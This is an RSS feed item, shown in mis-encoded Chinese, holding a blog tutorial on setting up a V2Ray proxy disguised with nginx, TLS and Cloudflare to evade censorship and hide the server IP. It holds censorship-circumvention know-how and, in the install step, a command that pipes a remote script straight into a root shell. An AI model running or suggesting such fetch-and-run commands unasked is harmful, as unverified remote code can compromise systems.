<?xml version="1.0" encoding="UTF-8"?>  
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">  
    <channel>  
        <title></title>  
        <description>ç‹ä¿Šåšå®¢ï¼Œè½¯ä»¶æ”¹å˜ä¸–ç•Œï¼ç‹ä¿Šåšå®¢æ˜¯ä½œè€…ä¸ªäººçŸ¥è¯†åº“ã€æ˜¯è®°å½•å†ç¨‹å›é¡¾çš„ç¬”è®°æœ¬ã€æ˜¯ç»éªŒæ•™è®­çš„èµ„æºæ± ï¼Œ æ—¨åœ¨ä¿ƒè¿›è½¯ä»¶å¼€å‘é¢†åŸŸçŸ¥è¯†ä¸åˆ›æ–°çš„ä¼ æ’­ï¼Œä¸ºè½¯ä»¶å¼€å‘ä¸­æä¾›å¸®åŠ©ã€‚æ›´å¤šæ˜¯ä½œè€…æœ¬äººçš„ç»éªŒç§¯ç´¯ã€‚
</description>  
        <link>http://localhost:4000</link>  
        <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />  
          
            <item>  
               <title>ğŸ”¥ æ—…è¡Œå¿…å¤‡ V2Ray çš„é«˜çº§ä½¿ç”¨æ–¹å¼</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-ä»‹ç»&quot; id=&quot;markdown-toc-1-ä»‹ç»&quot;&gt;1. ä»‹ç»&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-å®‰è£…å’Œä½¿ç”¨&quot; id=&quot;markdown-toc-2-å®‰è£…å’Œä½¿ç”¨&quot;&gt;2. å®‰è£…å’Œä½¿ç”¨&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-åˆ›å»ºå®ä¾‹&quot; id=&quot;markdown-toc-21-åˆ›å»ºå®ä¾‹&quot;&gt;2.1 åˆ›å»ºå®ä¾‹&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-æ‰§è¡Œå®‰è£…&quot; id=&quot;markdown-toc-22-æ‰§è¡Œå®‰è£…&quot;&gt;2.2 æ‰§è¡Œå®‰è£…&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-é…ç½®æ–‡ä»¶&quot; id=&quot;markdown-toc-23-é…ç½®æ–‡ä»¶&quot;&gt;2.3 é…ç½®æ–‡ä»¶&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#24-é‡å¯æœåŠ¡&quot; id=&quot;markdown-toc-24-é‡å¯æœåŠ¡&quot;&gt;2.4 é‡å¯æœåŠ¡&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#25-é…ç½®è¿æ¥&quot; id=&quot;markdown-toc-25-é…ç½®è¿æ¥&quot;&gt;2.5 é…ç½®è¿æ¥&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-æ¬ºéª—ä¸ä¼ªè£…&quot; id=&quot;markdown-toc-3-æ¬ºéª—ä¸ä¼ªè£…&quot;&gt;3. æ¬ºéª—ä¸ä¼ªè£…&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#31-æ•´ä½“æ–¹æ¡ˆ&quot; id=&quot;markdown-toc-31-æ•´ä½“æ–¹æ¡ˆ&quot;&gt;3.1 æ•´ä½“æ–¹æ¡ˆ&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#32-å®‰è£…nginx&quot; id=&quot;markdown-toc-32-å®‰è£…nginx&quot;&gt;3.2 å®‰è£…nginx&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#33-åŸŸåè§£æ&quot; id=&quot;markdown-toc-33-åŸŸåè§£æ&quot;&gt;3.3 åŸŸåè§£æ&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#34-å®‰å…¨è¯ä¹¦&quot; id=&quot;markdown-toc-34-å®‰å…¨è¯ä¹¦&quot;&gt;3.4 å®‰å…¨è¯ä¹¦&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#35-éšè—åœ°å€&quot; id=&quot;markdown-toc-35-éšè—åœ°å€&quot;&gt;3.5 éšè—åœ°å€&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#36-é…ç½®v2ray&quot; id=&quot;markdown-toc-36-é…ç½®v2ray&quot;&gt;3.6 é…ç½®v2ray&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#37-ä»£ç†è½¬å‘&quot; id=&quot;markdown-toc-37-ä»£ç†è½¬å‘&quot;&gt;3.7 ä»£ç†è½¬å‘&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#38-é…ç½®è¿æ¥&quot; id=&quot;markdown-toc-38-é…ç½®è¿æ¥&quot;&gt;3.8 é…ç½®è¿æ¥&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#å®Œæ•´çš„é…ç½®&quot; id=&quot;markdown-toc-å®Œæ•´çš„é…ç½®&quot;&gt;å®Œæ•´çš„é…ç½®&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;1-ä»‹ç»&quot;&gt;1. ä»‹ç»&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;//www.v2ray.com/&quot;&gt;V2Ray&lt;/a&gt; æ˜¯ä¸€ä¸ªä¸ Shadowsocks ç±»ä¼¼çš„ä»£ç†è½¯ä»¶ï¼Œå¾ˆå¤šäººå¯èƒ½ä¼šæƒ³å½“ç„¶åœ°å°† V2Ray çœ‹ä½œä¸€ä¸ªç‰¹å®šçš„ç¿»å¢™åè®®æˆ–ç”¨äºå®ç°è¯¥åè®®çš„ç¿»å¢™è½¯ä»¶ã€‚ä½†å®é™…ä¸Šæ˜¯ä¸€ä¸ªèåˆäº†å„ç§ç¿»å¢™åè®®çš„é›†æˆæ€§è½¯ä»¶ï¼Œå…¶ä¸­åªæœ‰ VMess åè®®æ˜¯ V2Ray ç¤¾åŒºåŸåˆ›çš„ç¿»å¢™åè®®ã€‚&lt;/p&gt;

&lt;h2 id=&quot;2-å®‰è£…å’Œä½¿ç”¨&quot;&gt;2. å®‰è£…å’Œä½¿ç”¨&lt;/h2&gt;

&lt;h3 id=&quot;21-åˆ›å»ºå®ä¾‹&quot;&gt;2.1 åˆ›å»ºå®ä¾‹&lt;/h3&gt;

&lt;p&gt;å‚è€ƒ &lt;a href=&quot;//wangjun.dev/2019/06/ssr-build/&quot;&gt;æ—…è¡Œå¿…å¤‡ ShadowsocketR æ­å»ºä¸ä½¿ç”¨&lt;/a&gt; ä¸­çš„åˆ›å»ºå®ä¾‹&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;å”¯ä¸€åŒºåˆ«å°±æ˜¯å»ºè®®å°†CPUè®¾ç½®ä¸ºâ€n1æ ‡å‡†å‹â€&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;22-æ‰§è¡Œå®‰è£…&quot;&gt;2.2 æ‰§è¡Œå®‰è£…&lt;/h3&gt;

&lt;p&gt;æ‰“å¼€ vm å®ä¾‹çš„ ssh ç»ˆç«¯ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œå®‰è£…ï¼š&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# åˆ‡æ¢æˆrootç”¨æˆ·&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# åŒæ­¥æœ¬åœ°æ—¶é—´&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/zoneinfo/Asia/Shanghai /etc/localtime

&lt;span class=&quot;c&quot;&gt;# æ‰§è¡Œä¸€é”®å®‰è£…è„šæœ¬&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; https://install.direct/go.sh&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç»ˆç«¯æ˜¾ç¤ºâ€V2Ray v4.19.1 is installed.â€ï¼Œè¡¨ç¤ºå·²ç»å®‰è£…å®Œæˆã€‚&lt;/p&gt;

&lt;h3 id=&quot;23-é…ç½®æ–‡ä»¶&quot;&gt;2.3 é…ç½®æ–‡ä»¶&lt;/h3&gt;

&lt;p&gt;ç‚¹å‡»ä¸‹è½½ &lt;a href=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/config.json&quot;&gt;config.json&lt;/a&gt; é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹ portã€idã€alterId å­—æ®µï¼Œidå’ŒalterIdéšæ„å˜æ›´ï¼Œä¿æŒä½æ•°ä¸€è‡´ã€‚port æœ€å¥½ä½¿ç”¨å·²ç»é…ç½®å¥½é˜²ç«å¢™è§„åˆ™çš„ç«¯å£ï¼ˆå…³äºé…ç½®é˜²ç«å¢™è§„åˆ™è¯·å‚çœ‹ &lt;a href=&quot;//wangjun.dev/2019/06/ssr-build/&quot;&gt;æ—…è¡Œå¿…å¤‡ ShadowsocketR æ­å»ºä¸ä½¿ç”¨&lt;/a&gt; ä¸­çš„é…ç½®é˜²ç«å¢™ä¸€èŠ‚ï¼‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/v2ray-config-json.png&quot; alt=&quot;v2ray-config-json&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å‡†å¤‡å¥½ v2ray çš„é…ç½®å†…å®¹åï¼Œåˆ°åˆšæ‰åˆ›å»ºçš„å®ä¾‹ä¸­ï¼Œä½¿ç”¨å‘½ä»¤&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/v2ray/config.json&lt;/code&gt;æ‰“å¼€v2rayçš„é…ç½®æ–‡ä»¶ï¼Œåˆ é™¤é‡Œé¢å…¨éƒ¨å†…å®¹ï¼Œå°†å‡†å¤‡å¥½çš„é…ç½®æ˜ç»†å¤åˆ¶è¿›å»ï¼Œå¤åˆ¶çš„æ ¼å¼å¾ˆä¹±ï¼Œä¸éœ€è¦å…³å¿ƒï¼Œv2rayä¼šæ­£å¸¸è§£æ&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;å°æŠ€å·§ï¼Œviç¼–è¾‘å™¨ä¸­ä½¿ç”¨å‘½ä»¤ :set paste æ‰“å¼€ç²˜è´´æ¨¡å¼å¯ä»¥ä¿è¯æ ¼å¼&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;24-é‡å¯æœåŠ¡&quot;&gt;2.4 é‡å¯æœåŠ¡&lt;/h3&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# é‡æ–°å¯åŠ¨v2rayæœåŠ¡&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl restart v2ray

&lt;span class=&quot;c&quot;&gt;# æŸ¥è¯¢å¯åŠ¨åæœåŠ¡çŠ¶æ€&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl status v2ray

&lt;span class=&quot;c&quot;&gt;# å°†v2rayæœåŠ¡æ³¨å†Œä¸ºå¼€æœºè‡ªè‡ªåŠ¨&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;v2ray
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;25-é…ç½®è¿æ¥&quot;&gt;2.5 é…ç½®è¿æ¥&lt;/h3&gt;

&lt;p&gt;ç‚¹å‡»ä¸‹è½½ &lt;a href=&quot;//github.com/Cenmrev/V2RayX/releases&quot;&gt;v2ray&lt;/a&gt; å®¢æˆ·ç«¯å¹¶å®‰è£…ã€‚&lt;/p&gt;

&lt;p&gt;æ‰€æœ‰é…ç½®åœ¨ä¸Šé¢çš„jsonä¸­éƒ½å¯ä»¥æ‰¾åˆ°ï¼Œé…ç½®å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/v2ray-client.png&quot; alt=&quot;v2ray-client&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é…ç½®å®Œæˆå¹¶saveåï¼Œç‚¹å‡»load coreå³å¯å¼€å¯å›½é™…æ—…è¡Œ&lt;/p&gt;

&lt;h2 id=&quot;3-æ¬ºéª—ä¸ä¼ªè£…&quot;&gt;3. æ¬ºéª—ä¸ä¼ªè£…&lt;/h2&gt;

&lt;p&gt;ä¸Šé¢çš„é…ç½®æ–¹å¼æ˜¯ç›´è¿ v2ray æœåŠ¡ç«¯ï¼Œè™½ç„¶ä½¿ç”¨çš„æ˜¯ vmes åè®®è¿™ç§å†·é—¨åè®®ï¼Œå°½ç®¡ä¹Ÿå¯¹ä¼ è¾“ä½“è¿›è¡Œäº†aesçš„åŠ å¯†ï¼Œä½†ä¸æ’é™¤ä¼Ÿå¤§çš„å¢™ä¼šæ‰¾åˆ°åè®®çš„ç‰¹å¾ç è¿›è¡Œblockï¼Œä¸ºäº†è¾¾åˆ°æè‡´æ•ˆæœï¼ŒåŸºäºä¸Šè¿°ç»§ç»­æˆ‘ä»¬çš„å‡çº§è®¡åˆ’ã€‚&lt;/p&gt;

&lt;h3 id=&quot;31-æ•´ä½“æ–¹æ¡ˆ&quot;&gt;3.1 æ•´ä½“æ–¹æ¡ˆ&lt;/h3&gt;

&lt;p&gt;[v2ray + websocket + tls + nginx + cdn]&lt;/p&gt;

&lt;p&gt;æ­¤å¤„åº”æœ‰å›¾ï¼Œæ‡’çš„ç”»äº†ï¼Œè‡ªå·±ç†è§£ã€‚&lt;/p&gt;

&lt;h3 id=&quot;32-å®‰è£…nginx&quot;&gt;3.2 å®‰è£…nginx&lt;/h3&gt;

&lt;p&gt;ç»§ç»­åœ¨ä¸Šé¢çš„æœåŠ¡å™¨ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£…nginxåå‘ä»£ç†æœåŠ¡å™¨ï¼ˆè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœ¨ç¬¬ä¸€æ­¥è¦æ±‚CPUç¨å¾®é«˜ç‚¹çš„åŸå› ï¼Œæ¯•ç«Ÿéœ€è¦å®‰è£…ä¸¤ä¸ªæœåŠ¡ï¼Œä¸èƒ½ä½¿ç”¨å¾®å‹CPUé…ç½®ï¼‰&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# åˆ‡æ¢æˆrootç”¨æˆ·&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# å®‰è£…nginxæœåŠ¡&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;nginx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å®‰è£…å®Œæˆåï¼Œé»˜è®¤nginxå°±å·²ç»å¯åŠ¨ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤&lt;code class=&quot;highlighter-rouge&quot;&gt;netstat -an | grep 80&lt;/code&gt;çœ‹çœ‹ç«¯å£æ˜¯å¦å¤„äº listen çŠ¶æ€ï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œç›´æ¥è¾“å…¥æœåŠ¡å™¨çš„IPåœ°å€åº”è¯¥å¯ä»¥çœ‹åˆ°nginxçš„æ¬¢è¿ç•Œé¢ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/nginx.png&quot; alt=&quot;nginx&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;33-åŸŸåè§£æ&quot;&gt;3.3 åŸŸåè§£æ&lt;/h3&gt;

&lt;p&gt;è¿™é‡Œä½¿ç”¨åœ¨é˜¿é‡Œäº‘æ³¨å†Œçš„åŸŸåä¸ºä¾‹ï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œå¯ä»¥åœ¨ &lt;a href=&quot;https://www.freenom.com/zh/index.html?lang=zh&quot;&gt;freenom&lt;/a&gt; å¯ä»¥ç”³è¯·å…è´¹åŸŸåã€‚å°†åŸŸåè§£æåˆ°ä¸Šé¢æœåŠ¡å™¨çš„å…¬ç½‘IPä¸Šï¼Œæ·»åŠ ä¸€ä¸ªè®°å½•ï¼Œè®°å½•ç±»å‹ä¸ºAï¼Œä¸»æœºè®°å½•ä¸ºrayï¼Œè¿™æ ·å°±å°†äºŒçº§åŸŸå ray.wangjun.bid è§£æåˆ°äº†å¯¹åº”çš„ Google äº‘æœåŠ¡å™¨ä¸Šã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/aliyun-parse.png&quot; alt=&quot;aliyun-parse&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åˆ°æœåŠ¡å™¨ä¸Šä½¿ç”¨å‘½ä»¤&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/nginx/sites-available/default&lt;/code&gt;æ‰“å¼€nginxé…ç½®æ–‡ä»¶ï¼Œåˆ é™¤é‡Œé¢æ‰€æœ‰å†…å®¹ï¼Œå°†åŸŸåé…ç½®åˆ°nginxçš„é…ç½®æ–‡ä»¶ä¸­ï¼Œæœ€ç»ˆå†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-conf highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; {
    &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_server&lt;/span&gt;;
    &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt; [::]:&lt;span class=&quot;m&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_server&lt;/span&gt;;

    &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;var&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;;
    &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;htm&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;nginx&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;debian&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;;

    &lt;span class=&quot;c&quot;&gt;# è¿™é‡Œä½¿ç”¨è‡ªå·±å®šä¹‰çš„åŸŸå
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;server_name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ray&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;wangjun&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;bid&lt;/span&gt;;

    &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; / {
        &lt;span class=&quot;n&quot;&gt;try_files&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;/ =&lt;span class=&quot;m&quot;&gt;404&lt;/span&gt;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¿å­˜é…ç½®ï¼Œå¹¶åœ¨ç»ˆç«¯ä¸­ä½¿ç”¨å‘½ä»¤&lt;code class=&quot;highlighter-rouge&quot;&gt;nginx -s reload&lt;/code&gt;è®©nginxé‡æ–°åŠ è½½é…ç½®ï¼Œè‹¥æ²¡æœ‰ä»»ä½•ä¿¡æ¯è¾“å‡ºè¡¨ç¤ºé…ç½®æ­£ç¡®ï¼Œé‡æ–°æ‰“å¼€æµè§ˆå™¨ä½¿ç”¨åŸŸåè®¿é—®åº”èƒ½æ­£å¸¸æ˜¾ç¤ºnginxçš„æ¬¢è¿é¡µé¢ï¼Œè¯´æ˜åŸŸåè§£ææˆåŠŸã€‚&lt;/p&gt;

&lt;h3 id=&quot;34-å®‰å…¨è¯ä¹¦&quot;&gt;3.4 å®‰å…¨è¯ä¹¦&lt;/h3&gt;

&lt;p&gt;ä¸Šé¢çš„è¾“å‡ºè¯´æ˜æˆ‘ä»¬æ­£å¸¸è§£æäº†åŸŸåï¼Œä½†80ç«¯å£çš„HTTPåè®®æ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œæˆ‘ä»¬éœ€è¦åœ¨HTTPåè®®ä¸Šå±‚åœ¨åŠ ä¸ŠTLSçš„HTTPSåè®®ï¼Œä½¿ä¼ è¾“å†…å®¹åŠ å¯†ã€‚&lt;/p&gt;

&lt;p&gt;è¦ä¸ºç«™ç‚¹ç”³è¯·HTTPsè¯ä¹¦ï¼Œå¯ä»¥ä½¿ç”¨ &lt;a href=&quot;https://letsencrypt.org/&quot;&gt;letsencrypt&lt;/a&gt; æœºæ„é¢å‘çš„å…è´¹è¯ä¹¦ï¼Œçœé’±åˆå¯é ï¼Œletsencrypt æœ‰ä¸ªå·¥å…· &lt;a href=&quot;https://certbot.eff.org&quot;&gt;certbot&lt;/a&gt;ï¼Œå…¨è‡ªåŠ¨ç”Ÿæˆè¯ä¹¦ï¼Œä¸‹é¢æ˜¯ä½¿ç”¨æ–¹æ³•ã€‚&lt;/p&gt;

&lt;p&gt;ç³»ç»Ÿç‰ˆæœ¬å’Œä»£ç†æœåŠ¡å™¨å®‰è£…æ–¹å¼ä¸ä¸€æ ·ï¼Œæ ¹æ®è‡ªå·±çš„é…ç½®æ¥ï¼Œè¿™é‡Œåœ¨ Google äº‘åˆ›å»ºçš„æ˜¯ debian9 çš„æ“ä½œç³»ç»Ÿï¼Œä»£ç†æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯ nginxï¼Œæ‰€ä»¥ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/certboot.png&quot; alt=&quot;certboot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é‚£æˆ‘ä»¬çš„å®‰è£…æ–¹å¼å°±æ˜¯ï¼š&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# åˆ‡æ¢æˆrootç”¨æˆ·&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# å®‰è£…certbotåŠå…¶ä¾èµ–&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;certbot python-certbot-nginx &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; stretch-backports
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é¢å‘è¯ä¹¦&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;certbot &lt;span class=&quot;nt&quot;&gt;--nginx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è¿™é‡Œä¼šè¦æ±‚è¾“å…¥å’Œé€‰æ‹©å‡ é¡¹é…ç½®ï¼Œå…·ä½“å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/publish-cert.png&quot; alt=&quot;publish-cert&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å‡ºç°â€Congratulationsâ€è¯´æ˜å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œé‡æ–°æ‰“å¼€æµè§ˆå™¨è¾“å…¥&lt;strong&gt;https://åŸŸå&lt;/strong&gt;å¯ä»¥æ­£å¸¸çœ‹è§nginxæ¬¢è¿ç•Œé¢ï¼Œä¸”æµè§ˆå™¨ç½‘å€å·¦è¾¹çš„å°é”æ­£å¸¸æ˜¾ç¤ºï¼ŒHTTPSé…ç½®å®Œæˆã€‚&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;letsencrypt ä¸ºæˆ‘ä»¬é¢å‘çš„HTTPsè¯ä¹¦æœ‰æ•ˆæœŸæ˜¯90å¤©ï¼Œ90å¤©åè¯ä¹¦ä¼šå¤±æ•ˆï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤&lt;code class=&quot;highlighter-rouge&quot;&gt;certbot renew --dry-run&lt;/code&gt;é‡æ–°é¢å‘ä¸€æ¬¡ï¼Œå½“ç„¶æœ€å¥½åœ¨cronä¸­é…ç½®å¥½å®šæ—¶ä»»åŠ¡æ¥è‡ªåŠ¨æ‰§è¡Œ&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;35-éšè—åœ°å€&quot;&gt;3.5 éšè—åœ°å€&lt;/h3&gt;

&lt;p&gt;PingåŸŸåå¯ä»¥å¾—åˆ°çœŸå®çš„æœåŠ¡å™¨åœ°å€ï¼Œå°½ç®¡å¯ä»¥ç¦pingå‘½ä»¤ï¼Œä½†ä»æœ‰å¾ˆå¤šå·¥å…·å¯ä»¥å‘ç°æˆ‘ä»¬åœ¨ Google äº‘ä¸ŠçœŸå®çš„æœåŠ¡å™¨IPï¼Œè¿™é‡Œä½¿ç”¨CDNè®©åŸŸåæŒ‡å‘åœ°å€å˜å¾—éšè—ï¼Œå°½ç®¡è¿™ä¸æ˜¯ç»å¯¹çš„ï¼Œä½†ä»èƒ½æœç»å¤§éƒ¨åˆ†æƒ³è·å–æœåŠ¡å™¨IPçš„æ–¹æ³•ã€‚&lt;/p&gt;

&lt;p&gt;CDNåŒæ ·æˆ‘ä»¬é€‰æ‹©å…è´¹çš„ï¼Œå…è´¹å³ç‹é“ï¼Œè¿™é‡Œé€‰æ‹© &lt;a href=&quot;https://www.cloudflare.com/zh-cn/&quot;&gt;CloudFlare&lt;/a&gt;ï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/CloudFlare-addsite.png&quot; alt=&quot;CloudFlare-addsite&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/CloudFlare-freeplan.png&quot; alt=&quot;CloudFlare-freeplan&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/CloudFlare-parse.png&quot; alt=&quot;CloudFlare-parse&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/CloudFlare-dns.png&quot; alt=&quot;CloudFlare-dns&quot; /&gt;&lt;/p&gt;

